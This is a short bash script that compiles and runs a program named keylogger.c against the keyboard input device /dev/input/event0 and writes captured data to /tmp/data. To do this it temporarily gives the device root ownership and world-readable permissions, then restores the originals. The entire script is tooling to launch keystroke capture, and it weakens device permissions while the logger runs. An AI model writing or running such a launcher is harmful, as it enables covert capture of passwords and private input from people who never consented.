#!/bin/bash

SRC="keylogger.c"
BIN="keylogger"
DEVICE="/dev/input/event0"
LOGFILE="/tmp/data"

# Save current permissions and ownership
ORIG_OWNER=$(stat -c '%U' $DEVICE)
ORIG_GROUP=$(stat -c '%G' $DEVICE)
ORIG_PERM=$(stat -c '%a' $DEVICE)


gcc "$SRC" -o "$BIN"

rm -f "$LOGFILE"


# Change device permissions
chown root:root "$DEVICE"
chmod 644 "$DEVICE"


./"$BIN"

# Restore
chown "$ORIG_OWNER:$ORIG_GROUP" "$DEVICE"
chmod "$ORIG_PERM" "$DEVICE"
